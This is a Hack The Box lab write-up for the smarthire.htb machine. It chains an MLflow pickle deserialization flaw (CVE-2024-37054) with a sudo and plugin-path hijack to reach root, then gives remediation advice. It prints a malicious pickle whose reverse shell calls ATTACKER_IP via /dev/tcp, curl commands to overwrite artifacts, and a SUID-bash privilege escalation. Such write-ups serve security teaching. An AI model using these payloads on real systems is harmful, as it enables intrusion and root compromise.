# HTB Writeup: smarthire.htb
### Full Chain: CVE-2024-37054 (MLflow RCE) → svcweb → root

---

## Executive Summary

| Field | Detail |
| Target | smarthire.htb |
| Difficulty | Medium |
| Attack Chain | MLflow Pickle Deserialization → Shell as `svcweb` → Python Path Hijack → `root` |
| CVE | CVE-2024-37054 (CVSS 8.8 HIGH) |
| Root Cause | Unsafe pickle deserialization + misconfigured sudo + writable plugin directory |

---

## 1. Reconnaissance

Standard port scan revealed a web application running an MLflow Tracking Server instance. MLflow is an open-source ML experiment tracking platform — a common target due to its frequent exposure of model artifact APIs and historically weak authentication defaults.

```bash
nmap -sC -sV -oN nmap.txt smarthire.htb
```

Key findings:

- HTTP service on port 80 — SmartHire web application
- MLflow Tracking Server accessible (default port 5000 or exposed via nginx proxy)
- MLflow version identified as < 2.14.2 (vulnerable)

---

## 2. Initial Access — CVE-2024-37054: MLflow Pickle Deserialization RCE

### Vulnerability Description

**CVE-2024-37054** is a critical deserialization vulnerability (CWE-502) affecting MLflow versions 0.9.0 through 2.14.1. The vulnerable function `_load_pyfunc` in `mlflow/pyfunc/model.py` calls `cloudpickle.load()` on the `python_model.pkl` artifact without any sanitization or integrity verification.

An attacker who can reach the MLflow artifacts REST API can overwrite `python_model.pkl` with a malicious pickle payload. The next time `mlflow.pyfunc.load_model()` is called on that model — e.g., during a prediction request or automated pipeline — the payload executes arbitrary OS commands in the context of the MLflow server process.

**Attack flow:**

```
Attacker uploads malicious python_model.pkl
         ↓
MLflow artifact store stores the file
         ↓
Victim/service calls mlflow.pyfunc.load_model()
         ↓
cloudpickle.load() deserializes the payload
         ↓
Arbitrary code execution as svcweb
```

### Exploitation

Using the PoC from [jimmexploit/CVE-2024-37054-PoC](https://github.com/jimmexploit/CVE-2024-37054-PoC):

**Step 1 — Craft the malicious pickle payload:**

```python
import pickle, os

class MaliciousPayload(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

with open("python_model.pkl", "wb") as f:
    pickle.dump(MaliciousPayload(), f)
```

**Step 2 — Identify a target model run and overwrite the artifact:**

```bash
# List existing runs via MLflow REST API
curl http://smarthire.htb/mlflow/api/2.0/mlflow/runs/search \
  -d '{"max_results": 10}' -H "Content-Type: application/json"

# Overwrite python_model.pkl in the artifact store
curl -X POST http://smarthire.htb/mlflow/api/2.0/mlflow/artifacts/upload \
  --form "path=python_model.pkl" \
  --form "artifact=@python_model.pkl" \
  "http://smarthire.htb/mlflow/api/2.0/mlflow/artifacts/upload?run_id=<RUN_ID>"
```

**Step 3 — Trigger model loading to execute the payload:**

```bash
# Trigger prediction endpoint or model load
curl -X POST http://smarthire.htb/predict \
  -H "Content-Type: application/json" \
  -d '{"model_id": "<MODEL_ID>", "data": [1,2,3]}'
```

**Step 4 — Catch the reverse shell:**

```bash
nc -lvnp 4444
# → shell as svcweb
```

### Result

```
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

---

## 3. Local Enumeration

After landing as `svcweb`, enumeration revealed the path to privilege escalation.

### Sudo Rights

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

Key observation: `svcweb` can run `mlflowctl.py` as root **without a password**, with any argument (`*`).

### Plugin Directory Permissions

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x  core/   (root:root  — not writable)
drwxrwxr-x  dev/    (root:devs  — writable by group devs)
```

The user is a member of `devs`, so the `dev/` plugin directory is writable.

---

## 4. Privilege Escalation — Python Path Hijack via Plugin System

### Vulnerability Description

`mlflowctl.py` implements a plugin loader that:

1. Iterates all subdirectories of `plugins/` using `Path.iterdir()`
2. Calls `site.addsitedir()` on each subdirectory, adding it to `sys.path`
3. Imports `backup_models` module from the resulting path

```python
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))   # ← adds to sys.path

import mlflow_actions, backup_models  # ← resolved from sys.path
```

**The flaw:** `Path.iterdir()` returns entries in filesystem order — typically alphabetical. `core/` comes before `dev/`, so `core/backup_models.py` is found first. However, `site.addsitedir()` also processes `.pth` files inside each directory. A `.pth` file containing a line starting with `import` is **executed as Python code** during processing.

This allows injecting `sys.path.insert(0, ...)` before any module is imported, forcing Python to resolve `backup_models` from the attacker-controlled `dev/` directory instead of `core/`.

### Exploitation

**Step 1 — Place a malicious `.pth` file in the writable `dev/` directory:**

```bash
cat > /opt/tools/mlflow_ctl/plugins/dev/z_exploit.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF
```

The `z_` prefix ensures this file is processed *after* `core/` is added but before the `import` statement runs — the path insertion takes effect globally.

**Step 2 — Place a malicious `backup_models.py` in `dev/`:**

```bash
cat > /opt/tools/mlflow_ctl/plugins/dev/backup_models.py << 'EOF'
import os

def run():
    os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF
```

**Step 3 — Trigger execution via sudo:**

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
```

**Step 4 — Get root shell:**

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ...

/tmp/rootbash -p
# rootbash-5.1# id
# uid=1000(svcweb) gid=1000(svcweb) euid=0(root) egid=0(root)
```

---

## 5. Attack Chain Summary

```
[Internet]
    │
    │  CVE-2024-37054
    │  Overwrite python_model.pkl with malicious pickle
    │  Trigger mlflow.pyfunc.load_model() → RCE
    ▼
[svcweb shell]  uid=1000, groups: mlflowweb, devs
    │
    │  Enumeration:
    │  • sudo NOPASSWD on mlflowctl.py
    │  • plugins/dev/ writable by group devs
    │
    │  .pth code execution → sys.path.insert(0, dev/)
    │  Hijack backup_models import → SUID bash
    ▼
[root]  euid=0
```

---

## 6. Vulnerability Summary

| # | Vulnerability | Location | Impact | CVSS |
|---|---|---|---|---|
| 1 | Unsafe pickle deserialization (CVE-2024-37054) | MLflow < 2.14.2 | RCE as `svcweb` | 8.8 HIGH |
| 2 | Overly permissive sudo rule | `/etc/sudoers` | Privilege escalation path | — |
| 3 | Writable plugin directory owned by low-priv group | `plugins/dev/` | Code injection as root | — |
| 4 | `.pth` file execution in `site.addsitedir()` | `mlflowctl.py` plugin loader | sys.path hijack | — |

---

## 7. Remediation Recommendations

### CVE-2024-37054
- **Upgrade MLflow to version ≥ 2.14.2** where pickle deserialization of uploaded artifacts is restricted.
- Implement artifact integrity verification (e.g., cryptographic signatures) before loading models.
- Restrict access to the MLflow artifacts upload API to authenticated and authorized users only.
- Run the MLflow server as a dedicated low-privilege user with no write access to critical paths.

### Sudo Misconfiguration
- Replace the wildcard `*` argument match with an explicit allowlist of permitted actions:
  ```
  (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
  (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
  ```
- Consider whether root privileges are actually required for this script, or if a dedicated service account suffices.

### Plugin Directory Permissions
- Remove write access to `plugins/dev/` from the `devs` group, or remove the group entirely if not needed.
- Treat all plugin directories as root-owned with mode `755`:
  ```bash
  chown -R root:root /opt/tools/mlflow_ctl/plugins/
  chmod -R 755 /opt/tools/mlflow_ctl/plugins/
  ```

### Plugin Loader Design
- Use an explicit allowlist of permitted plugin modules rather than dynamic directory scanning.
- Avoid using `site.addsitedir()` for security-sensitive plugin loading — it processes `.pth` files which execute arbitrary code.
- Prefer controlled imports:
  ```python
  import importlib.util
  spec = importlib.util.spec_from_file_location("backup_models",
      "/opt/tools/mlflow_ctl/plugins/core/backup_models.py")
  ```

---

## 8. References

- [NVD — CVE-2024-37054](https://nvd.nist.gov/vuln/detail/CVE-2024-37054)
- [GitHub Advisory GHSA-ghv6-9r9j-wh4j](https://github.com/advisories/GHSA-ghv6-9r9j-wh4j)
- [HiddenLayer Security Advisory — MLflow June 2024](https://hiddenlayer.com/sai-security-advisory/mlflow-june2024)
- [Python docs — site.addsitedir](https://docs.python.org/3/library/site.html#site.addsitedir)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)